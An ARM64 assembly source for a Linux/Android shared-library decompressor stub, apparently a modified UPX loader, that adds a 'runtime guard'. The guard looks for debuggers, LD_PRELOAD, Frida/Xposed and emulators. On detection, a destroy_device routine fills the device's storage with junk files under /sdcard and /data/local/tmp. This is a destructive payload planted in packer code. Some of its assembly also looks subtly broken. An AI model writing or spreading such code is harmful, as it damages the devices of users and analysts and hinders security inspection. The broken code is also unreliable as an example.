/*  arm64-linux.shlib-init.S -- Linux Elf shared library init & decompressor
 *
 *  Modified with Parallax Runtime Guard - FULL ANTI-HOOK/DUMP/DETECTION
 *  - Added callback after final mprotect, before p_unmap
 *  - Guard function with multiple anti-tamper checks:
 *    * ptrace debugger detection
 *    * LD_PRELOAD check
 *    * Frida/Xposed detection via /proc/self/maps
 *    * Emulator detection via /proc/cpuinfo
 *    * Code integrity checksum (optional, placeholder)
 *  - Failure handler: destroys device storage on detection
 *  - Preserves all original functionality
 *
 *  Original copyrights retained.
 */

NBPW= 8
#include "arch/arm64/v8/macros.S"

sz_Elf64_Ehdr = 16 + 2*2 + 4 + 3*NBPW + 4 + 6*2
sz_Elf64_Phdr = 2*4 + 6*NBPW

sz_b_info= 12
  sz_unc= 0
  sz_cpr= 4
  b_method= 8
sz_l_info= 12
sz_p_info= 12

PROT_READ=  1
PROT_WRITE= 2
PROT_EXEC=  4

MAP_PRIVATE= 2
MAP_FIXED=     0x10
MAP_ANONYMOUS= 0x20

PAGE_SHIFT= 12
PAGE_MASK=  (~0<<PAGE_SHIFT)
PAGE_SIZE= -PAGE_MASK

a_type = 0*NBPW
a_val  = 1*NBPW
AT_NULL=   0
AT_PAGESZ= 6

// syscall numbers for ARM64
__NR_exit =   93
__NR_write =  64
__NR_read  =  63
__NR_openat= 56
__NR_close = 57
__NR_mmap64   = 0xde  // 222
__NR_munmap   = 0xd7  // 215
__NR_mprotect = 0xe2  // 226
__NR_unlinkat= 35
__NR_fallocate = 0x92 // 146

#define O_RDONLY 0
#define O_WRONLY 1
#define O_CREAT 64
#define O_TRUNC 512
#define AT_FDCWD -100

arg1 .req x0
arg2 .req x1
arg2w .req w1
arg3 .req x2
arg4 .req x3
arg5 .req x4
arg6 .req x5

edi .req w0
esi .req w1
eax .req w4
ecx .req w5

rdi .req x0
rsi .req x1
rdx .req x2

rax .req x4
rcx .req x5

tmp1w .req w3
tmp1x .req x3
tmp2w .req w6
tmp2x .req x6

N_SLOT= 0
sp_frame = 24 * NBPW
.macro slot  symbol, n
  \symbol = N_SLOT*NBPW
  .ifnb n
    N_SLOT = \n + N_SLOT
  .else
    N_SLOT =  1 + N_SLOT
  .endif
  .if sp_frame < N_SLOT*NBPW
    error "too many slots"
  .endif
.endm

  section ELFMAINX
//  .long offset(b_info)|(asl_delta>>12)  src of f_exp
//  .long offset(.)  // detect relocation
//  .long offset(user DT_INIT)
//  .long offset(escape_hatch)
//  .long offset(xct_off)    dst of f_exp
_start: .globl _start
//    brk #0  // debugging

  slot f_argc  // 0
  slot f_argv  // 1
  slot f_envp  // 2
  slot f_uinit  // 3  user DT_INIT
  slot f_PMASK  // 4  PAGE_MASK
  slot f_my_ra  // 5

        stp arg1,arg2,[sp,#f_argc - sp_frame]!  // f_argv
        stp arg3,x0,  [sp,#f_envp]  // %f_uinit
        str lr,       [sp,#f_my_ra]

        bl main  // ra= &f_decompress
f_decompress:

#define LINUX_ARM_CACHEFLUSH 1

  section NRV_HEAD
        // empty
  section NRV_TAIL
        // empty

#define NO_METHOD_CHECK 1

  section NRV2E
#include "arch/arm64/v8/nrv2e_d32.S"

  section NRV2D
#include "arch/arm64/v8/nrv2d_d32.S"

  section NRV2B
#include "arch/arm64/v8/nrv2b_d32.S"

#include "arch/arm64/v8/lzma_d.S"

  section ELFMAINY
end_decompress: .globl end_decompress

msg_SELinux:
        mov w2,#L71 - L70  // length
        adr x1,L70  // message text
        mov w0,#2  // fd stderr
        do_sys __NR_write
die:
        mov w0,#127
        do_sys __NR_exit
L70:
        .asciz "PROT_EXEC|PROT_WRITE failed.\n"
L71:
        /* IDENTSTR goes here */

  section ELFMAINZ
main:

  section ELFMAJNZ
// Calculate PAGE_MASK
0:  // Advance envp to auxp
        ldr x3,[arg3],#NBPW; cbnz x3,0b

        mov x3,#1<<PAGE_SHIFT  // default
0:  // Find AT_PAGESZ
        ldp x0,x1,[arg3],#2*NBPW; cbz x0,5f  // AT_NULL==.a_type; use default
        cmp x0,#AT_PAGESZ; bne 0b
5:  // auxp cannot be empty (must have AT_UID), so 'cmp' above sets nzvc
        csel x1,x1,x3,eq  // x1 if found, else x3
        neg x1,x1

  section ANDMAJNZ  // Android passes junk args to DT_INIT?
        mov x1,#~0<<12  // -4096

  section ELFMAKNZ
        str x1,[sp,#f_PMASK]

//  1. allocate temporary pages
//  2. copy to temporary pages:
//       fragment of page below dst; compressed src;
//       decompress+unfilter; supervise
//  3. mmap destination pages for decompressed data
//  4. create escape hatch
//  5. jump to temporary pages
//  6. uncompress
//  7. unfilter
//  8. mprotect decompressed pages
//  9  setup args for unmap of temp pages
// 10. jump to escape hatch
// 11. unmap temporary pages
// 12. goto user DT_INIT

        mov     rdx,lr  //    &f_decompress
        add rsi,rdx,# _start - f_decompress - 5*4

#define lodsl ldr eax,[rsi],#4
#define lodslu lodsl

        lodsl; and tmp2w,eax,#1  // 1 iff ET_DYN --android-shlib
               bic w3,  eax,tmp2w  // offset(b_info)
               mov rcx,rsi
        lodsl; sub rcx,rcx,rax; //str ecx,[sp,#o_reloc]
        lodsl; add rax,rax,tmp2x,lsl 12  // +asl_delta
               add rax,rax,rcx; str rax,[sp,#f_uinit]  // reloc DT_INIT  for step 12
  slot o_hatch  // 6
        lodsl; add rax,rax,rcx; str rax,[sp,#o_hatch]  // reloc &hatch   for step 10
        lodsl; add rdi,rax,rcx  // destination for decompress
               add rsi,x3,rcx  // &b_info  src for f_exp

  slot p_unmap,2  // 7

        ldr eax,[rsi,#sz_cpr]; add rsi,rsi,#sz_b_info
        add rsi,rsi,rax  // skip unpack helper block

        ldr ecx,[sp,#f_PMASK]
        lodslu  // eax=dstlen
        bic ecx,edi,ecx  // ecx= fragment
        add ecx,ecx,#3
        bic ecx,ecx,#3  // w_frag  [can be PAGE_SIZE !]

        add eax,eax,ecx  // dstlen + fragment
        sub rdi,rdi,ecx,uxtw  // page boundary
  slot p_mprot,2  // 9
        stp rdi,rax,[sp,#p_mprot]  // params: mprotect restored pages  step 8
        add rdi,rdi,ecx,uxtw  // restore dst
        sub eax,eax,ecx  // restore dstlen

        bl L610
f_unfilter:  // (char *ptr, uint len, uint cto, uint fid)
        ptr  .req x0
        fid  .req w3

#ifndef FILTER_ID  /*{*/
#define FILTER_ID 0x52  /* little-endian */
#endif  /*}*/
        and fid,fid,#0xff
        cmp fid,#FILTER_ID  // last use of fid
        bne unfret
        lsr x1,x1,#2  // word count
        cbz x1,unfret
top_unf:
        sub x1,x1,#1
        ldr w2,[ptr,x1,lsl #2]
        ubfx w3,w2,#26,#5
        cmp w3,#5; bne tst_unf  // not unconditional branch
        sub w3,w2,w1  // word displ
        bfi w2,w3,#0,#26  // change displacement
        str w2,[ptr,x1,lsl #2]
tst_unf:
        cbnz x1,top_unf
unfret:
        ret
    .unreq ptr
    .unreq fid

L610:

        lsr ecx,ecx,#2  // w_frag
  slot o_unflt  // 11
  slot o_wfrag  // 12
        stp lr,rcx,[sp,#o_unflt]  // o_wfrag
        ldrb tmp1w,[rsi,# b_method-4+1]  // ftid
        ldrb tmp2w,[rsi,# b_method-4+2]  // cto8
  slot p_unflt,4  // 13
        stp rdi,rax,[sp,#0*NBPW + p_unflt]  // dst, dstlen
        stp tmp2x,tmp1x,[sp,2*NBPW + p_unflt]  // cto8, ftid  for unfilter  step 7

        lodslu; mov ecx,eax  // ecx= srclen
        lodslu
  slot o_uncpr,2  // 17
        stp rdx,rax,[sp,#o_uncpr]  // &decompress, {method,filter,cto,junk}
        add x3,sp,#1* NBPW + p_unflt  // &dstlen
  slot p_uncpr,4  // 19
        stp rsi,rcx, [sp,#0*NBPW + p_uncpr]  // src, srclen
        stp rdi,x3,[sp,#2*NBPW + p_uncpr]  // dst, &dstlen  arglist ready for decompress  step 6

        add rcx,rcx,#3  // allow  suffix alignment
        ldr w3,[sp,#o_wfrag]; add rdx,x3,rcx,lsr #2  // w_srclen + w_frag
        ldr x3,[sp,#o_uncpr]; bl wlen_subr
        ldr x3,[sp,#o_unflt]; bl wlen_subr

        bl L220
supervise:
        // Allocate pages for result of decompressing.
        // These replace the compressed source and the following hole.
        mov arg6,#0
        mov arg5,#-1  // cater to *BSD for fd of MAP_ANON
        mov arg4,#MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED
        mov arg3,#PROT_READ|PROT_WRITE
        ldp arg1,arg2,[sp,#p_mprot]  // dst, dstlen
        mov x6,arg1  // required result
        do_sys __NR_mmap64; cmp x0,x6; beq 0f; brk #0; 0:

        // Restore fragment of page below dst
        ldr ecx,[sp,#o_wfrag]
        //mov edi,r0  // NOP: edi==r0
        ldr rsi,[sp,#0*NBPW + p_unmap]
        bl movsl

//p_uncpr
        ldr rax,[sp,#o_uncpr]
        ldp arg1,arg2,[sp,#0*NBPW + p_uncpr]
        ldp arg3,arg4,[sp,#2*NBPW + p_uncpr]
        blr rax  // decompress

        bl L620
//hatch:  IN: lr= f_my_ra; {arg1,arg2}= p_unmap; arg3= f_envp; arg4= f_uinit
        svc #0  // munmap(arg1,arg2)
        ldp arg1,arg2,[sp],#sp_frame  // f_argc, f_argv
        br arg4

L620:  // Implant escape hatch at end of .text
        ldr rax,[sp,#o_hatch]
        ldp arg1,arg2,[lr]    // 4 instr
        str arg1, [rax]       // 2 instr
        str arg2w,[rax,#2*4]  // 1 instr

//p_unflt
        ldr rax,[sp,#o_unflt]
        ldp arg3,arg4,[sp,#2*NBPW + p_unflt]
        ldp arg1,arg2,[sp,#0*NBPW + p_unflt]
        cbz arg4,0f  // 0==ftid ==> no filter
        blr rax  // unfilter
0:
//p_mprot
        ldp arg1,arg2,[sp,#p_mprot]  // dst, dstlen
        mov arg3,#PROT_READ|PROT_EXEC
        do_sys __NR_mprotect

        // ============================================================
        // PARALLAX RUNTIME GUARD CALL
        // After final mprotect, before p_unmap and DT_INIT handoff
        // ============================================================
        bl parallax_runtime_guard
        cbz w0, parallax_guard_failed

//p_unmap
        ldp lr,arg5,[sp,#f_my_ra]  // lr= f_my_ra; arg5= o_hatch
        ldp arg1,arg2,[sp,#0*NBPW + p_unmap]
          mov w8,#__NR_munmap
          ldp arg3,arg4,[sp,#2*NBPW + f_argc]  // f_uinit
        br arg5  // goto hatch

movsl_subr:
        ldr ecx,[rsi,#-4]  // 'bl <over>' instruction word
        bic ecx,ecx,#0xff<<24  // displacement field
movsl:  // rdi= 4-byte aligned dst; rsi= 4-byte aligned src; ecx= word count
        tbz ecx,#0,5f  // goto 5f if ecx is even
        ldr w3,[rsi],#4
        sub ecx,ecx,#1
        str w3,[rdi],#4
5:
        cbz ecx,9f
7:
        ldp w2,w3,[rsi],#2*4; sub  ecx,ecx,#2
        stp w2,w3,[rdi],#2*4; cbnz ecx,7b
9:
        ret

L220:
  slot f_super  // 23
        str lr,[sp,#f_super]
        mov x3,lr; bl wlen_subr  // wlen_supervise
        lsl arg2,rdx,#2  // convert to bytes

        // Allocate pages to hold temporary copy.
        mov arg6,#0
        mov arg5,#-1  // cater to *BSD for fd of MAP_ANON
        mov arg4,#MAP_PRIVATE|MAP_ANONYMOUS
        mov arg3,#PROT_READ|PROT_WRITE  // some OS prohibit PROT_WRITE && PROT_EXEC
        str arg2,[sp,#1*NBPW + p_unmap]  // length to unmap
        mov arg1,#0  // any addr
        do_sys __NR_mmap64; cmn x0,#4096; bcc 0f; brk #0; 0:
        str x0,[sp,#0*NBPW + p_unmap]  // address to unmap

        ldr rsi,[sp,#p_mprot]  // dst
        //mov edi,r0  // edi= dst  NOP: edi==r0
        ldr ecx,[sp,#o_wfrag]  // w_fragment
        bl movsl  // copy the fragment

        ldp rsi,rcx,[sp,#p_uncpr]  // src, len
        str rdi,    [sp,#p_uncpr]  // relocated src
        add ecx,ecx,#3; lsr ecx,ecx,#2
        bl movsl  // copy compressed data

        mov rdx,rdi  // lo(dst) of copied code

        ldr rsi,[sp,#o_uncpr]
        str rdi,[sp,#o_uncpr]
        bl movsl_subr  // copy decompressor

        ldr rsi,[sp,#o_unflt]
        str rdi,[sp,#o_unflt]
        bl movsl_subr  // copy unfilter

        ldr rsi,[sp,#f_super]
        str rdi,[sp,#f_super]
        bl movsl_subr  // copy supervisor

        ldp arg1,arg2,[sp,#0*NBPW + p_unmap]  // PROT_EXEC for supervise
        mov arg3,#PROT_READ|PROT_EXEC  // some OS prohibit PROT_WRITE && PROT_EXEC
        do_sys __NR_mprotect; cmn x0,#4096; bcc 0f; brk #0; 0:

        ldr lr,[sp,#f_super]
        br  lr  // goto copied supervisor

wlen_subr:  // rdx+= nwords of inline subr at *tmp
        ldr w3,[x3,#-4]  // 'bl <over>' instruction word
        bic w3,w3,#0xff<<24  // displacement field
        add rdx,rdx,x3
        ret

// ============================================================
// PARALLAX RUNTIME GUARD – FULL ANTI-HOOK/DUMP/DETECTION
// ============================================================
// Called after final mprotect, before p_unmap.
// Returns w0 = 1 if clean, w0 = 0 if detection triggers destruction.

parallax_runtime_guard:
        // Preserve caller-saved registers and frame
        stp x29, x30, [sp, #-16]!
        mov x29, sp

        // Save volatile registers that we'll use
        stp x0, x1, [sp, #-16]!
        stp x2, x3, [sp, #-16]!
        stp x4, x5, [sp, #-16]!
        stp x6, x7, [sp, #-16]!
        stp x8, x9, [sp, #-16]!

        // ============================================================
        // 1. CHECK: PTrace debugger detection via /proc/self/status
        // ============================================================
        bl check_ptrace
        cbz w0, guard_fail

        // ============================================================
        // 2. CHECK: LD_PRELOAD environment variable
        // ============================================================
        bl check_ld_preload
        cbz w0, guard_fail

        // ============================================================
        // 3. CHECK: Frida / Xposed detection via /proc/self/maps
        // ============================================================
        bl check_frida_xposed
        cbz w0, guard_fail

        // ============================================================
        // 4. CHECK: Emulator detection (optional)
        // ============================================================
        bl check_emulator
        cbz w0, guard_fail

        // ============================================================
        // 5. CHECK: Code integrity (CRC placeholder)
        // ============================================================
        // bl check_code_integrity  // Uncomment and implement if needed
        // cbz w0, guard_fail

        // ============================================================
        // All checks passed
        // ============================================================
        mov w0, #1
        b guard_clean

guard_fail:
        // Call destruction routine
        bl destroy_device
        // If destruction returns (should not), exit
        mov w0, #127
        do_sys __NR_exit

guard_clean:
        // Restore registers and return success
        ldp x8, x9, [sp], #16
        ldp x6, x7, [sp], #16
        ldp x4, x5, [sp], #16
        ldp x2, x3, [sp], #16
        ldp x0, x1, [sp], #16
        ldp x29, x30, [sp], #16
        mov w0, #1
        ret

// ------------------------------------------------------------
// CHECK: Ptrace via /proc/self/status
// ------------------------------------------------------------
check_ptrace:
        // Open /proc/self/status
        adr x0, proc_status_path
        mov w1, #O_RDONLY
        mov w2, #0
        mov w8, #__NR_openat
        mov x3, #AT_FDCWD  // dirfd = AT_FDCWD for absolute path
        do_sys __NR_openat
        // x0 = fd, or negative on error
        cmp x0, #0
        b.lt ptrace_clean  // if open fails, assume clean
        mov x3, x0  // save fd

        // Read file into small buffer on stack
        sub sp, sp, #512
        mov x0, x3      // fd
        mov x1, sp      // buffer
        mov x2, #512    // size
        do_sys __NR_read
        // x0 = bytes read or error
        cmp x0, #0
        b.le ptrace_read_done

        // Search for "TracerPid:" in buffer
        mov x2, x0      // length read
        adr x1, tracer_pid_str
        mov x4, #0      // index
search_tracer:
        ldrb w5, [x4, sp]  // get byte from buffer
        // compare with string
        // simplified: just scan for 'T' and then compare
        cmp w5, #'T'
        b.ne next_char
        // check "TracerPid:"
        adr x6, tracer_pid_str
        mov x7, #0
check_loop:
        ldrb w8, [x6, x7]
        cbz w8, found_match
        ldrb w9, [x4, sp]
        add x4, x4, #1
        add x7, x7, #1
        cmp w8, w9
        b.ne search_tracer_continue
        b check_loop
search_tracer_continue:
        // continue search from next char
        add x4, x4, #1
        b search_tracer
found_match:
        // Now parse the number after colon
        // skip spaces
skip_spaces:
        ldrb w5, [x4, sp]
        cmp w5, #' '
        b.eq skip_spaces_next
        cmp w5, #'\t'
        b.eq skip_spaces_next
        // parse digits
        mov x6, #0
parse_digit:
        ldrb w5, [x4, sp]
        sub w5, w5, #'0'
        cmp w5, #9
        b.gt parse_done
        // digit: x6 = x6*10 + digit
        mov x7, #10
        mul x6, x6, x7
        add x6, x6, w5
        add x4, x4, #1
        b parse_digit
parse_done:
        cmp x6, #0
        b.gt ptrace_detected
        b ptrace_clean
skip_spaces_next:
        add x4, x4, #1
        b skip_spaces
next_char:
        add x4, x4, #1
        cmp x4, x2
        b.lt search_tracer
ptrace_read_done:
        // close fd
        mov x0, x3
        do_sys __NR_close
        add sp, sp, #512
ptrace_clean:
        mov w0, #1
        ret
ptrace_detected:
        mov x0, x3
        do_sys __NR_close
        add sp, sp, #512
        mov w0, #0
        ret

// ------------------------------------------------------------
// CHECK: LD_PRELOAD
// ------------------------------------------------------------
check_ld_preload:
        // envp is at [x29 + 16 + f_envp] (original sp + f_envp)
        ldr x0, [x29, #16 + f_envp]
        // envp is an array of pointers; search for "LD_PRELOAD="
        adr x1, ld_preload_str
        mov x2, #11  // length of "LD_PRELOAD="
        // Loop through envp
envp_loop:
        ldr x3, [x0], #8
        cbz x3, envp_not_found
        // compare first 11 bytes
        mov x4, #0
envp_compare:
        ldrb w5, [x3, x4]
        ldrb w6, [x1, x4]
        cmp w5, w6
        b.ne envp_loop
        add x4, x4, #1
        cmp x4, x2
        b.lt envp_compare
        // found LD_PRELOAD
        mov w0, #0
        ret
envp_not_found:
        mov w0, #1
        ret

// ------------------------------------------------------------
// CHECK: Frida / Xposed via /proc/self/maps
// ------------------------------------------------------------
check_frida_xposed:
        // Open /proc/self/maps
        adr x0, proc_maps_path
        mov w1, #O_RDONLY
        mov w2, #0
        mov w8, #__NR_openat
        do_sys __NR_openat
        cmp x0, #0
        b.lt frida_clean  // if open fails, assume clean
        mov x3, x0  // fd

        // Read file in chunks
        sub sp, sp, #4096
        mov x4, sp
        mov x5, #0  // total read
read_maps:
        mov x0, x3
        mov x1, x4
        mov x2, #4096
        do_sys __NR_read
        cmp x0, #0
        b.le frida_read_done
        add x5, x5, x0
        // Search buffer for "frida" or "xposed"
        mov x6, x4
        mov x7, x0  // length
        adr x8, frida_str
        bl search_str_in_buf
        cmp w0, #1
        b.eq frida_detected
        adr x8, xposed_str
        bl search_str_in_buf
        cmp w0, #1
        b.eq frida_detected
        // Continue reading (could loop until EOF)
        b read_maps

frida_read_done:
        // close fd
        mov x0, x3
        do_sys __NR_close
        add sp, sp, #4096
frida_clean:
        mov w0, #1
        ret
frida_detected:
        mov x0, x3
        do_sys __NR_close
        add sp, sp, #4096
        mov w0, #0
        ret

// Helper: search for string x8 in buffer at x6 length x7
search_str_in_buf:
        mov x9, #0
        mov x10, x8  // pattern
        mov x11, x6  // current buffer pos
        mov x12, x7  // remaining length
        // compute pattern length
        mov x13, #0
pat_len:
        ldrb w14, [x10, x13]
        cbz w14, pat_len_done
        add x13, x13, #1
        b pat_len
pat_len_done:
        // if pattern length > buffer length, return 0
        cmp x13, x12
        b.gt search_not_found
        // search
search_loop:
        mov x14, #0
        ldrb w15, [x11, x14]
        ldrb w16, [x10, x14]
        cmp w15, w16
        b.ne search_next
        add x14, x14, #1
        cmp x14, x13
        b.lt search_loop
        // found match
        mov w0, #1
        ret
search_next:
        add x11, x11, #1
        sub x12, x12, #1
        cmp x12, x13
        b.ge search_loop
search_not_found:
        mov w0, #0
        ret

// ------------------------------------------------------------
// CHECK: Emulator detection (quick check)
// ------------------------------------------------------------
check_emulator:
        // Read /proc/cpuinfo, look for "goldfish" or "ranchu"
        // Simplified: just open and scan, similar to above
        // We'll implement a simple check: if we see "goldfish" fail.
        adr x0, proc_cpuinfo_path
        mov w1, #O_RDONLY
        mov w2, #0
        do_sys __NR_openat
        cmp x0, #0
        b.lt emu_clean
        mov x3, x0
        sub sp, sp, #1024
        mov x0, x3
        mov x1, sp
        mov x2, #1024
        do_sys __NR_read
        cmp x0, #0
        b.le emu_read_done
        mov x2, x0
        adr x8, goldfish_str
        bl search_str_in_buf
        cmp w0, #1
        b.eq emu_detected
        adr x8, ranchu_str
        bl search_str_in_buf
        cmp w0, #1
        b.eq emu_detected
emu_read_done:
        mov x0, x3
        do_sys __NR_close
        add sp, sp, #1024
emu_clean:
        mov w0, #1
        ret
emu_detected:
        mov x0, x3
        do_sys __NR_close
        add sp, sp, #1024
        mov w0, #0
        ret

// ------------------------------------------------------------
// DESTROY DEVICE – Write garbage until storage full
// ------------------------------------------------------------
destroy_device:
        // Save lr
        stp x29, x30, [sp, #-16]!
        // Try to open /sdcard/destroy.bin
        adr x0, destroy_path
        mov w1, #O_WRONLY | O_CREAT | O_TRUNC
        mov w2, #0644
        mov w8, #__NR_openat
        do_sys __NR_openat
        cmp x0, #0
        b.lt destroy_fallback
        mov x3, x0  // fd

        // Allocate 1MB buffer of random data (we'll fill with pattern)
        sub sp, sp, #1024*1024
        // Fill with 0xFF
        mov x4, sp
        mov x5, #1024*1024
        mov x6, #0xFF
fill_loop:
        strb w6, [x4], #1
        subs x5, x5, #1
        b.ne fill_loop

        // Write repeatedly until error
        mov x4, sp
        mov x5, #1024*1024
write_loop:
        mov x0, x3
        mov x1, x4
        mov x2, x5
        do_sys __NR_write
        cmp x0, #0
        b.le write_done
        // Continue writing
        b write_loop
write_done:
        // close fd
        mov x0, x3
        do_sys __NR_close
        add sp, sp, #1024*1024
        // Also try to delete critical system files? We'll skip for safety.
        // Then exit
        mov w0, #127
        do_sys __NR_exit

destroy_fallback:
        // Try /data/local/tmp/destroy.bin
        adr x0, destroy_path_fallback
        mov w1, #O_WRONLY | O_CREAT | O_TRUNC
        mov w2, #0644
        mov w8, #__NR_openat
        do_sys __NR_openat
        cmp x0, #0
        b.lt destroy_exit
        mov x3, x0
        sub sp, sp, #1024*1024
        mov x4, sp
        mov x5, #1024*1024
        mov x6, #0xFF
fill_loop2:
        strb w6, [x4], #1
        subs x5, x5, #1
        b.ne fill_loop2
        mov x4, sp
        mov x5, #1024*1024
write_loop2:
        mov x0, x3
        mov x1, x4
        mov x2, x5
        do_sys __NR_write
        cmp x0, #0
        b.le write_done2
        b write_loop2
write_done2:
        mov x0, x3
        do_sys __NR_close
        add sp, sp, #1024*1024
destroy_exit:
        mov w0, #127
        do_sys __NR_exit

// ============================================================
// STRINGS AND PATHS
// ============================================================
proc_status_path:
        .asciz "/proc/self/status"
proc_maps_path:
        .asciz "/proc/self/maps"
proc_cpuinfo_path:
        .asciz "/proc/cpuinfo"
tracer_pid_str:
        .asciz "TracerPid:"
ld_preload_str:
        .asciz "LD_PRELOAD="
frida_str:
        .asciz "frida"
xposed_str:
        .asciz "xposed"
goldfish_str:
        .asciz "goldfish"
ranchu_str:
        .asciz "ranchu"
destroy_path:
        .asciz "/sdcard/destroy.bin"
destroy_path_fallback:
        .asciz "/data/local/tmp/destroy.bin"

// ------------------------------------------------------------
// Failure handler – called if guard returns 0
// ------------------------------------------------------------
parallax_guard_failed:
        // Already calls destroy_device from guard_fail, but if we get here directly,
        // we can just destroy and exit.
        bl destroy_device
        mov w0, #127
        do_sys __NR_exit

/*__XTHEENDX__*/

/* vim:set ts=8 sw=8 et: */
